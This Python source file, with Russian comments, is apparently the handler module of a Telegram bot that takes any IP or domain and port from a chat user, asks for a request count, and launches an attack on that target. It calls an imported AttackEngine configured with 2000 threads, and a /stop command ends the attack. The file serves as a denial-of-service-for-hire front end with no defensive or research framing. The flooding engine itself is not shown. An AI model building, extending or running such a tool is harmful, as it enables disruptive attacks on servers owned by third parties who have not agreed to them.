import telebot
from telebot.types import Message
import asyncio
import threading
import re
from attack_engine import AttackEngine

# Хранилище состояний пользователей
user_data = {}
attack_engines = {}

# Вспомогательные функции (дублирую на случай, если utils.py не подтянется)
def parse_ip_port(text):
    pattern = r'^([a-zA-Z0-9.-]+):(\d+)$'
    match = re.match(pattern, text.strip())
    if match:
        return match.group(1), int(match.group(2))
    return None, None

def is_valid_port(port):
    return 1 <= port <= 65535

def register_handlers(bot):
    
    @bot.message_handler(commands=['start'])
    def start_command(message: Message):
        chat_id = message.chat.id
        user_data[chat_id] = {}
        bot.send_message(
            chat_id, 
            "Привет! 👋\nРад видеть тебя в нашем боте))\nПиши ip, port сервера."
        )

    @bot.message_handler(commands=['stop'])
    def stop_command(message: Message):
        chat_id = message.chat.id
        if chat_id in attack_engines and attack_engines[chat_id].running:
            attack_engines[chat_id].stop()
            bot.send_message(chat_id, "⛔ Атака остановлена.")
        else:
            bot.send_message(chat_id, "Активных атак нет.")

    @bot.message_handler(func=lambda m: True)
    def handle_all_messages(message: Message):
        chat_id = message.chat.id
        text = message.text.strip()

        # Если пользователь не инициализирован – создаём
        if chat_id not in user_data:
            user_data[chat_id] = {}

        # Шаг 1: ожидаем ввод ip:port
        if 'target' not in user_data[chat_id]:
            ip, port = parse_ip_port(text)
            if ip and is_valid_port(port):
                user_data[chat_id]['target'] = f"{ip}:{port}"
                bot.send_message(chat_id, "Введите кол-во запросов😉")
            else:
                bot.send_message(
                    chat_id, 
                    "❌ Неверный формат. Пиши как: 192.168.1.1:8080 или domain.com:443"
                )
            return

        # Шаг 2: ожидаем ввод количества запросов
        if 'count' not in user_data[chat_id]:
            try:
                count = int(text)
                if count < 1:
                    bot.send_message(chat_id, "Количество должно быть больше 0")
                    return

                target = user_data[chat_id]['target']
                user_data[chat_id]['count'] = count

                bot.send_message(
                    chat_id,
                    f"🚀 ЗАПУСК АТАКИ НА {target} с {count} пакетами/запросами"
                )

                # Запуск атаки в отдельном потоке, чтобы не блокировать бота
                def run_attack():
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    engine = AttackEngine(max_threads=2000)  # можно вынести в config
                    attack_engines[chat_id] = engine
                    loop.run_until_complete(engine.single_attack(target, count))
                    bot.send_message(
                        chat_id, 
                        f"✅ Атака завершена. Отправлено {count} пакетов."
                    )
                    # Удаляем движок после завершения
                    if chat_id in attack_engines:
                        del attack_engines[chat_id]

                thread = threading.Thread(target=run_attack)
                thread.daemon = True
                thread.start()

                # Очищаем состояние пользователя (чтобы можно было начать заново)
                del user_data[chat_id]

            except ValueError:
                bot.send_message(chat_id, "❌ Введите целое число (количество запросов)")
